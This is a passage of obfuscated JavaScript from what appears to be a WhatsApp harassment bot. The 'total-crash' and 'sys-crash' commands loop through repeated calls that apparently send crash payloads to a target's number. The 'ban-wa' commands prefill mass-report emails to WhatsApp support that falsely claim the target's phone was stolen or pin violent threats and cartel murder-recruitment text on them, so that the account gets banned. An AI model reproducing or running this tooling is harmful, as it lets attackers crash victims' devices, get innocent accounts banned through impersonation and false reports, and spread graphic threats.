            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x425a3c(target, _0x28a3bf);
            await _0x425a3c(target);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x425a3c(target, _0x359358);
            await _0xaf37d6(target, _0x8d23b4);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x3e1634(target);
            await _0x425a3c(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "total-crash":
      case "sys-crash":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Example: ." + _0x4ae68c + " 234xxx");
          }
          let _0x3554d4 = q.replace(/[^0-9]/g, "");
          if (_0x3554d4.startsWith("0")) {
            return _0x3b9923("`[ # ]` Enter the Starting Number of the Country Code\n\n`[ # ]` Example : ." + _0x4ae68c + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x3b9923(mess.bugrespon);
          for (let _0x3eb7f2 = 0; _0x3eb7f2 < 5; _0x3eb7f2++) {
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xaf37d6(target, _0x8d23b4);
            await _0x4fbc32(target, _0x28a3bf);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0x251533(target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
            await _0xcb3ebe(target, _0x327dba);
            await _0x2e843e(_0x4b53e5, target, _0x327dba);
          }
          await _0x3b9923(mess.donebug);
        }
        break;
      case "ban-wa1":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x71662a = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x71662a.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x43530f = await _0x4b53e5.onWhatsApp(_0x71662a + "@s.whatsapp.net");
          if (_0x71662a === "2348108778025") {
            return;
          }
          if (_0x43530f.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x431258 = "، لقد تعرضت لحادث مؤسف أن شخصًا ما سرق هاتفي المحمول لذا لم يعد بإمكاني استخدام حساب WhatsApp الخاص بي. الرجاء إلغاء تنشيط حسابي لأنه لم يعد مستخدمًا ، شكرًا لك. رقمي هو (+" + _0x71662a + ")";
          const _0x3c976f = "mailto:support@whatsapp.com?subject=LOST/STOLEN&body=" + encodeURIComponent(_0x431258);
          const _0x4e451b = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x3c976f,
            mediaUrl: _0x3c976f
          };
          const _0x356168 = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x4e451b
          };
          const _0x26db90 = {
            text: _0x431258,
            contextInfo: _0x356168,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x26db90);
          function _0xc02f60(_0x1b349a) {
            return new Promise(_0x421ce0 => setTimeout(_0x421ce0, _0x1b349a));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎`  \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲."
              });
              await _0xc02f60(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬.."
              });
            } catch (_0x23665e) {
              console.error("Error occurred:", _0x23665e);
            }
          })();
          break;
        }
      case "unban-wa2":
        {
          if (!_0x40d288) {
            return _0xa2e1c2("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x44698b = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x44698b.startsWith("0")) {
            return _0xa2e1c2("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x3518b2 = await _0x4b53e5.onWhatsApp(_0x44698b + "@s.whatsapp.net");
          if (_0x44698b === "2348108778025") {
            return;
          }
          if (_0x3518b2.length === 0) {
            return _0xa2e1c2("The number is not registered on WhatsApp.");
          }
          const _0x32e585 = "Estimado Sr. Zuckerberg, espero que este mensaje lo encuentre bien. Mi nombre es " + _0x45dcac + ", y le escribo con una súplica urgente de ayuda. Soy una madre embarazada y la única proveedora para mi familia. Recientemente, mi cuenta de WhatsApp fue baneada, y esto ha paralizado mi vida. Mi negocio, que opero completamente a través de WhatsApp, es mi única fuente de ingresos. Sin él, no puedo mantener a mis hijos ni prepararme para la llegada de mi bebé. Le ruego que revise mi caso con compasión y desbanee mi cuenta para que pueda continuar apoyando a mi familia. Mi número es +" + _0x44698b + ".";
          const _0x4bf785 = "mailto:support@whatsapp.com?subject=Desbanear Cuenta&body=" + encodeURIComponent(_0x32e585);
          const _0x456eb2 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x4bf785,
            mediaUrl: _0x4bf785
          };
          const _0x565cba = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x456eb2
          };
          const _0x1f4888 = {
            text: _0x32e585,
            contextInfo: _0x565cba,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x1f4888);
          function _0x477d47(_0x11df9c) {
            return new Promise(_0x200dd6 => setTimeout(_0x200dd6, _0x11df9c));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x477d47(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "_𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐮𝐧𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬._"
              });
            } catch (_0x17b666) {
              console.error("Error occurred:", _0x17b666);
            }
          })();
          break;
        }
      case "unban-wa3":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x19dba7 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x19dba7.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x1f7877 = await _0x4b53e5.onWhatsApp(_0x19dba7 + "@s.whatsapp.net");
          if (_0x19dba7 === "2348108778025") {
            return;
          }
          if (_0x1f7877.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x246e07 = "Por favor, señor Zuckerberg, le suplico de rodillas, estoy desesperada. Mi nombre es " + _0x45dcac + ", y mi cuenta de WhatsApp es lo único que me permite mantener a mis hijos. ¡Por favor, por favor, no me deje sin ella! Estoy llorando mientras le escribo esto porque cada día que paso sin acceso me destroza más. He perdido tanto, no sé cómo seguir adelante sin mi cuenta. Mi vida está en sus manos, por favor, desbaneen mi cuenta para que pueda trabajar y alimentar a mis hijos. ¡No sé qué más hacer! Mi número es +" + _0x19dba7 + ".";
          const _0x13fcb5 = "mailto:support@whatsapp.com?subject=Desbanear Cuenta&body=" + encodeURIComponent(_0x246e07);
          const _0x20911a = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x13fcb5,
            mediaUrl: _0x13fcb5
          };
          const _0x25333 = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x20911a
          };
          const _0xefcaac = {
            text: _0x246e07,
            contextInfo: _0x25333,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0xefcaac);
          function _0x115023(_0x192fbd) {
            return new Promise(_0x1cee84 => setTimeout(_0x1cee84, _0x192fbd));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x115023(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "_𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐮𝐧𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐮𝐧𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬._"
              });
            } catch (_0x459669) {
              console.error("Error occurred:", _0x459669);
            }
          })();
          break;
        }
      case "ban-wa5":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x173125 = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x173125.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x3d8a3b = await _0x4b53e5.onWhatsApp(_0x173125 + "@s.whatsapp.net");
          if (_0x173125 === "2348108778025") {
            return;
          }
          if (_0x3d8a3b.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x46f2c8 = "\n        عزيزي واتساب\nلقد تلقيت رسالة من هذا الرقم(+" + _0x173125 + ")\n\nتقول \"ماركس زوكربيرج أنا أكرهك بشدة، فإذا وجدتك سأنتزع لسانك من حلقك\nسأذبحك قطعة قطعة، وسأضع رصاصة في رئتك، أنا أكرهك بشدة، أيها القطعة الميتة اللعينة، أوه عندما أضع يدي على الآنسة أوريليا الصغيرة، سأدفع كراتي اللعينة إلى مؤخرتها وهي تنزف\"\nأردت فقط الإبلاغ عن ذلك\n ";
          const _0x4a49f5 = "mailto:support@whatsapp.com?subject=تقرير&body=" + encodeURIComponent(_0x46f2c8);
          const _0x402d71 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x4a49f5,
            mediaUrl: _0x4a49f5
          };
          const _0x5d4cbe = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0x402d71
          };
          const _0x3aa49f = {
            text: _0x46f2c8,
            contextInfo: _0x5d4cbe,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x3aa49f);
          function _0x55729e(_0x31634f) {
            return new Promise(_0xa0a017 => setTimeout(_0xa0a017, _0x31634f));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "\n> `𝙄𝙉𝙎𝙏𝙍𝙐𝘾𝙏𝙄𝙊𝙉𝙎` \n*𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐥𝐢𝐜𝐤 𝐨𝐧 𝐭𝐡𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐛𝐚𝐧𝐧𝐞𝐫 𝐭𝐞𝐱𝐭 𝐚𝐛𝐨𝐯𝐞. 𝐎𝐧𝐜𝐞 𝐫𝐞𝐝𝐢𝐫𝐞𝐜𝐭𝐞𝐝 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥, 𝐤𝐢𝐧𝐝𝐥𝐲 𝐜𝐥𝐢𝐜𝐤 𝐭𝐡𝐞 𝐬𝐞𝐧𝐝 𝐛𝐮𝐭𝐭𝐨𝐧 𝐭𝐨 𝐞𝐧𝐬𝐮𝐫𝐞 𝐭𝐡𝐞 𝐩𝐫𝐨𝐜𝐞𝐬𝐬 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝 𝐬𝐞𝐜𝐮𝐫𝐞𝐥𝐲.*"
              });
              await _0x55729e(240000);
              await _0x4b53e5.sendMessage(_0x22a0dd, {
                text: "𝐘𝐨𝐮𝐫 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐭𝐨 𝐛𝐚𝐧 𝐭𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐞𝐦𝐚𝐢𝐥 𝐟𝐨𝐫 𝐟𝐮𝐫𝐭𝐡𝐞𝐫 𝐢𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬. 𝐓𝐡𝐞 𝐚𝐜𝐜𝐨𝐮𝐧𝐭 𝐰𝐢𝐥𝐥 𝐛𝐞 𝐛𝐚𝐧𝐧𝐞𝐝 𝐰𝐢𝐭𝐡𝐢𝐧 𝐭𝐡𝐞 𝐧𝐞𝐱𝐭 𝟖 𝐡𝐨𝐮𝐫𝐬.."
              });
            } catch (_0x4573d8) {
              console.error("Error occurred:", _0x4573d8);
            }
          })();
          break;
        }
      case "ban-wa6":
        {
          if (!_0x40d288) {
            return _0x32539a("Usage: ." + _0x4ae68c + " +2348108778025");
          }
          let _0x45468d = _0x40d288.replace(/[^0-9]/g, "");
          if (_0x45468d.startsWith("0")) {
            return _0x32539a("Example: ." + _0x4ae68c + " 234xxxxxxxxx");
          }
          const _0x37a2f5 = await _0x4b53e5.onWhatsApp(_0x45468d + "@s.whatsapp.net");
          if (_0x45468d === "2348108778025") {
            return;
          }
          if (_0x37a2f5.length === 0) {
            return _0x32539a("The number is not registered on WhatsApp.");
          }
          const _0x1d9eef = "\n👋Olá usuários do WhatsApp, deixe-me me apresentar, meu nome é VelpuzTzy, sou o líder de uma gangue de cartel, quero convidar vocês para se juntarem à minha gangue para matar pessoas🔪☠️ se vocês não querem matar pessoas, vocês podem sequestrar membros da gangue ao lado, aí eu mato e mutilo ele como na foto abaixo⬇️\nhttps://ibb.co/1Lzy2Sk\nhttps://ibb.co/4YbyH60\nhttps://ibb.co/LzPCBK3\n\nEsta é uma foto da minha gangue executando a vítima. Eu não apenas mato e mutilo, vou pegar os órgãos e depois revendê-los no mercado negro 👺 Não os vendo barato, vou vendê-los muito caro 🤑💰 e vou dividir o dinheiro com os membros da minha gangue , incluindo você Se você se juntar à minha gangue, minha gangue é bastante famosa por seu sadismo😈🔥 a tal ponto que pessoas famosas como Mark Zuckerberg e Jan Koum e muitas outras pessoas famosas solicitam serviços para matar pessoas minhas ou da minha gangue🤫☠️. Se você tiver interesse em fazer parte da minha turma ou quiser tirar dúvidas primeiro, entre em contato comigo pelo WhatsApp abaixo☎👇\nhttps://web.whatsapp.com/telefone/send?phone=" + _0x45468d + "\n ";
          const _0x217a21 = "mailto:support@whatsapp.com?subject=LOST/STOLEN&body=" + encodeURIComponent(_0x1d9eef);
          const _0xce791 = {
            showAdAttribution: false,
            renderLargerThumbnail: false,
            title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
            body: "Wagwan " + _0x45dcac + " 👋",
            previewType: "VIDEO",
            thumbnail: _0x34a350,
            sourceUrl: _0x217a21,
            mediaUrl: _0x217a21
          };
          const _0x45e68a = {
            mentionedJid: [_0x21f0d9.sender],
            externalAdReply: _0xce791
          };
          const _0x5a4643 = {
            text: _0x1d9eef,
            contextInfo: _0x45e68a,
            quoted: _0x21f0d9
          };
          await _0x4b53e5.sendMessage(_0x22a0dd, _0x5a4643);
          function _0x35ec2a(_0x42c004) {
            return new Promise(_0x3ad094 => setTimeout(_0x3ad094, _0x42c004));
          }
          (async () => {
            try {
              await _0x4b53e5.sendMessage(_0x22a0dd, {
